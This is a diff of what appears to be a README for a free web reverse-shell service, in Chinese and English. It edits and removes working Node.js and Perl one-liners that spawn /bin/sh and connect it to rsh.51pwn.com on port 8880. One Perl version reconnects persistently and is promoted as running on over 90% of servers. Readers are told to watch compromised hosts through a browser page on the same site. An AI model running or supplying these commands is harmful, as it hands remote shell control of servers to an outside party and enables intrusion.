@@ -18,39 +18,17 @@ one id Multi-target
 Note: A good reverse shell will keep reconnecting to the server even if you type exit
   注意：一个优秀的reverse shell会吃重要，即便你输入 exit 也会不断重新连接到服务器
 ```
-node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("YourId\n");client.write("{}\n") }); return /a/;})();'
+node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("YourId\n{}\n");client.write("{}\n") }); return /a/;})();'
 ```
   *** 特别推荐下面的命令，经过若干 AI 的优化，可以覆盖 90% 以上的服务器上正确运行, 下面的命令明显比上面的更加优化，即便你关闭浏览器，或者输入exit，下面的代码会自动重新上线
 ```
-  perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com")))){print S "YourId\n";open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh -i");}wait();}};'
+  perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com")))){print S "YourId\n{}\n";open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh -i");}wait();}};'
 ```
 * open your browser
   *** 注意后面的id必须和上面的一致
 https://51pwn.com/indexes/xterm.html?id=YourId
  ** 注意，这个时候你什么也没有看见，没错，因为还没有目标连接上来 **
 
-"""
-# Free web reverse shell
-* 1 setYourId: xxxx_001
-** Of course you can set a string that only you know
-** Must be output to the server in reverse shell to facilitate correlation
-** New feature: Several targets can be reverse shelled to the web browser at the same time
-
-* 2 start your reverse shell
-   *** The first line is sent to the server, telling the server your associated ID: xxxx_001
-   *** The second line is a json data, which can usually be used to collect target environment information and feed it back to the server.
-   Note that the following command will not reconnect to the server when you type exit
-```
-node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net .Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); client.write("xxxx_001\n");client.write("{}\n") }); return /a/;})();'
-```
-   *** The following command is particularly recommended. After several AI optimizations, it can cover more than 90% of servers and run correctly. The following command is obviously more optimized than the above. Even if you close the browser or enter exit, the following code will Automatically come back online
-```
-   perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com"))) ){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh - i");};};};'
-```
-* open your browser
-   *** Note that the following id must be consistent with the above
-https://51pwn.com/indexes/xterm.html?id=xxxx_001
-** Note that you don’t see anything at this time, that’s right, because there is no target connected yet **
 """
 
 
